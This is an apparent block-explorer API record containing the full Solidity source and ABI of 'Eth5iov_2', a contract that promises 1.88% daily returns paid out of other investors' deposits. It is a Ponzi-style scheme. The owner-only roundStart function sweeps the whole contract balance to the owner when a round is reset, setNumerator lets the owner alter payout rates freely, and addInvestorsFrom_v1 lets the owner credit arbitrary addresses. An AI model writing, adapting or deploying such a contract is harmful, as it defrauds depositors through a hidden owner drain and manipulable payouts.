{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.25;\r\n\r\ncontract Eth5iov_2 {\r\n    address public advertising;\r\n    address public admin;\r\n    address private owner;\r\n\r\n    uint constant public statusFreeEth = 10 finney;\r\n    uint constant public statusBasic = 50 finney;\r\n    uint constant public statusVIP = 5 ether;\r\n    uint constant public statusSVIP = 25 ether;\r\n\r\n    uint constant public dailyPercent = 188;\r\n    uint constant public dailyFreeMembers = 200;\r\n    uint constant public denominator = 10000;\r\n\r\n    uint public numerator = 100;\r\n    uint public dayDepositLimit = 555 ether;\r\n    uint public freeFund;\r\n    uint public freeFundUses;\r\n\r\n    uint public round = 0;\r\n    address[] public addresses;\r\n    mapping(address => Investor) public investors;\r\n    bool public resTrigger = true;\r\n    uint constant period = 5;// 86400;\r\n\r\n    uint dayDeposit;\r\n    uint roundStartDate;\r\n    uint daysFromRoundStart;\r\n    uint deposit;\r\n    uint creationDate; \r\n    enum Status { TEST, BASIC, VIP, SVIP }\r\n\r\n    struct Investor {\r\n        uint id;\r\n        uint round;\r\n        uint deposit;\r\n        uint deposits;\r\n        uint investDate;\r\n        uint lastPaymentDate;\r\n        address referrer;\r\n        Status status;\r\n        bool refPayed;\r\n    }\r\n\r\n    event TestDrive(address addr, uint date);\r\n    event Invest(address addr, uint amount, address referrer);\r\n    event WelcomeVIPinvestor(address addr);\r\n    event WelcomeSuperVIPinvestor(address addr);\r\n    event Payout(address addr, uint amount, string eventType, address from);\r\n    event roundStartStarted(uint round, uint date);\r\n\r\n    modifier onlyOwner {\r\n        require(msg.sender == owner, \"Sender not authorised.\");\r\n        _;\r\n    }\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n        admin = 0xb34a732Eb42A02ca5b72e79594fFfC10F55C33bd; \r\n        advertising = 0x63EA308eF23F3E098f8C1CE2D24A7b6141C55497; \r\n        freeFund = 2808800000000000000;\r\n        creationDate = now;\r\n        roundStart();\r\n    }\r\n\r\n    function addInvestorsFrom_v1(address[] addr, uint[] amount, bool[] isSuper) onlyOwner public {\r\n\r\n        // transfer VIP/SVIP status\r\n        for (uint i = 0; i < addr.length; i++) {\r\n            uint id = addresses.length;\r\n            if (investors[addr[i]].deposit==0) {\r\n                deposit += amount[i];\r\n            }\r\n            addresses.push(addr[i]);\r\n            Status s = isSuper[i] ? Status.SVIP : Status.VIP;\r\n            investors[addr[i]] = Investor(id, round, amount[i], 1, now, now, 0, s, false);\r\n        }\r\n    }\r\n\r\n    function waiver() private {\r\n        delete owner; //\r\n    }\r\n\r\n    function() payable public {\r\n\r\n        if (msg.sender == owner) {  \r\n            return;\r\n        }\r\n\r\n        require(resTrigger == false, \"Contract is paused. Please wait for the next round.\");\r\n\r\n        if (0 == msg.value) {\r\n            payout();\r\n            return;\r\n        }\r\n\r\n        require(msg.value >= statusBasic || msg.value == statusFreeEth, \"Too small amount, minimum 0.05 ether\");\r\n\r\n        if (daysFromRoundStart < daysFrom(roundStartDate)) {\r\n            dayDeposit = 0;\r\n            freeFundUses = 0;\r\n            daysFromRoundStart = daysFrom(roundStartDate);\r\n        }\r\n\r\n        require(msg.value + dayDeposit <= dayDepositLimit, \"Daily deposit limit reached! See you soon\");\r\n        dayDeposit += msg.value;\r\n\r\n        Investor storage user = investors[msg.sender];\r\n\r\n        if ((user.id == 0) || (user.round < round)) {\r\n\r\n            msg.sender.transfer(0 wei); \r\n\r\n            addresses.push(msg.sender);\r\n            user.id = addresses.length;\r\n            user.deposit = 0;\r\n            user.deposits = 0;\r\n            user.lastPaymentDate = now;\r\n            user.investDate = now;\r\n            user.round = round;\r\n\r\n            // referrer\r\n            address referrer = bytesToAddress(msg.data);\r\n            if (investors[referrer].id > 0 && referrer != msg.sender\r\n               && investors[referrer].round == round) {\r\n                user.referrer = referrer;\r\n            }\r\n        }\r\n\r\n        // save investor\r\n        user.deposit += msg.value;\r\n        user.deposits += 1;\r\n        deposit += msg.value;\r\n        emit Invest(msg.sender, msg.value, user.referrer);\r\n\r\n        // sequential deposit cash-back on 30+\r\n        if ((user.deposits > 1) && (user.status != Status.TEST) && (daysFrom(user.investDate) > 30)) {\r\n            uint cashBack = msg.value / denominator * numerator * 10; \r\n            if (msg.sender.send(cashBack)) {\r\n                emit Payout(user.referrer, cashBack, \"Cash-back after 30 days\", msg.sender);\r\n            }\r\n        }\r\n\r\n        Status newStatus;\r\n        if (msg.value >= statusSVIP) {\r\n            emit WelcomeSuperVIPinvestor(msg.sender);\r\n            newStatus = Status.SVIP;\r\n        } else if (msg.value >= statusVIP) {\r\n            emit WelcomeVIPinvestor(msg.sender);\r\n            newStatus = Status.VIP;\r\n        } else if (msg.value >= statusBasic) {\r\n            newStatus = Status.BASIC;\r\n        } else if (msg.value == statusFreeEth) {\r\n            if (user.deposits == 1) { \r\n                require(dailyFreeMembers > freeFundUses, \"Max free fund uses today, See you soon!\");\r\n                freeFundUses += 1;\r\n                msg.sender.transfer(msg.value);\r\n                emit Payout(msg.sender,statusFreeEth,\"Free eth cash-back\",0);\r\n            }\r\n            newStatus = Status.TEST;\r\n        }\r\n        if (newStatus > user.status) {\r\n            user.status = newStatus;\r\n        }\r\n\r\n        // proccess fees and referrers\r\n        if (newStatus != Status.TEST) {\r\n            admin.transfer(msg.value / denominator * numerator * 5);  // administration fee\r\n            advertising.transfer(msg.value / denominator * numerator * 10); // advertising fee\r\n            freeFund += msg.value / denominator * numerator;          // test-drive fee fund\r\n        }\r\n        user.lastPaymentDate = now;\r\n    }\r\n\r\n    function payout() private {\r\n\r\n        Investor storage user = investors[msg.sender];\r\n\r\n        require(user.id > 0, \"Investor not found.\");\r\n        require(user.round == round, \"Your round is over.\");\r\n        require(daysFrom(user.lastPaymentDate) >= 1, \"Wait at least 24 hours.\");\r\n\r\n        uint amount = getInvestorDividendsAmount(msg.sender);\r\n\r\n        if (address(this).balance < amount) {\r\n            resTrigger = true;\r\n            return;\r\n        }\r\n\r\n        if ((user.referrer > 0x0) && !user.refPayed && (user.status != Status.TEST)) {\r\n            user.refPayed = true;\r\n            Investor storage ref = investors[user.referrer];\r\n            if (ref.id > 0 && ref.round == round) {\r\n\r\n                uint bonusAmount = user.deposit / denominator * numerator * 5;\r\n                uint refBonusAmount = user.deposit / denominator * numerator * 5 * uint(ref.status);\r\n\r\n                if (user.referrer.send(refBonusAmount)) {\r\n                    emit Payout(user.referrer, refBonusAmount, \"Cash back refferal\", msg.sender);\r\n                }\r\n\r\n                if (user.deposits == 1) { // cashback only for the first deposit\r\n                    if (msg.sender.send(bonusAmount)) {\r\n                        emit Payout(msg.sender, bonusAmount, \"ref-cash-back\", 0);\r\n                    }\r\n                }\r\n\r\n            }\r\n        }\r\n\r\n        if (user.status == Status.TEST) {\r\n            uint daysFromInvest = daysFrom(user.investDate);\r\n            require(daysFromInvest <= 55, \"Your test drive is over!\");\r\n\r\n            if (sendFromfreeFund(amount, msg.sender)) {\r\n                emit Payout(msg.sender, statusFreeEth, \"test-drive-self-payout\", 0);\r\n            }\r\n        } else {\r\n            msg.sender.transfer(amount);\r\n            emit Payout(msg.sender, amount, \"self-payout\", 0);\r\n        }\r\n        user.lastPaymentDate = now;\r\n    }\r\n\r\n    function sendFromfreeFund(uint amount, address user) private returns (bool) {\r\n        require(freeFund > amount, \"Test-drive fund empty! See you later.\");\r\n        if (user.send(amount)) {\r\n            freeFund -= amount;\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    // views\r\n    function getInvestorCount() public view returns (uint) {\r\n        return addresses.length - 1;\r\n    }\r\n\r\n    function getInvestorDividendsAmount(address addr) public view returns (uint) {\r\n        return investors[addr].deposit / denominator / 100 * dailyPercent  //NOTE: numerator!\r\n                * daysFrom(investors[addr].lastPaymentDate) * numerator;\r\n    }\r\n\r\n    // configuration\r\n    function setNumerator(uint newNumerator) onlyOwner public {\r\n        numerator = newNumerator;\r\n    }\r\n\r\n    function setDayDepositLimit(uint newDayDepositLimit) onlyOwner public {\r\n        dayDepositLimit = newDayDepositLimit;\r\n    }\r\n\r\n    function roundStart() onlyOwner public {\r\n        if (resTrigger == true) {\r\n            delete addresses;\r\n            addresses.length = 1;\r\n            deposit = 0;\r\n            dayDeposit = 0;\r\n            roundStartDate = now;\r\n            daysFromRoundStart = 0;\r\n            owner.transfer(address(this).balance);\r\n            emit roundStartStarted(round, now);\r\n            resTrigger = false;\r\n            round += 1;\r\n        }\r\n    }\r\n\r\n    // util\r\n    function daysFrom(uint date) private view returns (uint) {\r\n        return (now - date) / period;\r\n    }\r\n\r\n    function bytesToAddress(bytes bys) private pure returns (address addr) {\r\n        assembly {\r\n            addr := mload(add(bys, 20))\r\n        }\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"newDayDepositLimit\",\"type\":\"uint256\"}],\"name\":\"setDayDepositLimit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"dayDepositLimit\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"round\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"dailyPercent\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"statusSVIP\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"roundStart\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newNumerator\",\"type\":\"uint256\"}],\"name\":\"setNumerator\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"advertising\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"dailyFreeMembers\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"investors\",\"outputs\":[{\"name\":\"id\",\"type\":\"uint256\"},{\"name\":\"round\",\"type\":\"uint256\"},{\"name\":\"deposit\",\"type\":\"uint256\"},{\"name\":\"deposits\",\"type\":\"uint256\"},{\"name\":\"investDate\",\"type\":\"uint256\"},{\"name\":\"lastPaymentDate\",\"type\":\"uint256\"},{\"name\":\"referrer\",\"type\":\"address\"},{\"name\":\"status\",\"type\":\"uint8\"},{\"name\":\"refPayed\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"statusFreeEth\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"freeFund\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getInvestorCount\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"denominator\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"statusVIP\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"statusBasic\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"getInvestorDividendsAmount\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"numerator\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"resTrigger\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address[]\"},{\"name\":\"amount\",\"type\":\"uint256[]\"},{\"name\":\"isSuper\",\"type\":\"bool[]\"}],\"name\":\"addInvestorsFrom_v1\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"freeFundUses\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"addresses\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"admin\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"date\",\"type\":\"uint256\"}],\"name\":\"TestDrive\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"referrer\",\"type\":\"address\"}],\"name\":\"Invest\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"WelcomeVIPinvestor\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"WelcomeSuperVIPinvestor\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"eventType\",\"type\":\"string\"},{\"indexed\":false,\"name\":\"from\",\"type\":\"address\"}],\"name\":\"Payout\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"round\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"date\",\"type\":\"uint256\"}],\"name\":\"roundStartStarted\",\"type\":\"event\"}]","ContractName":"Eth5iov_2","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://b5af7e9ca9788762546273dbe46b4eb1739f55d0701521fa52e0b90e1251cda2"}]}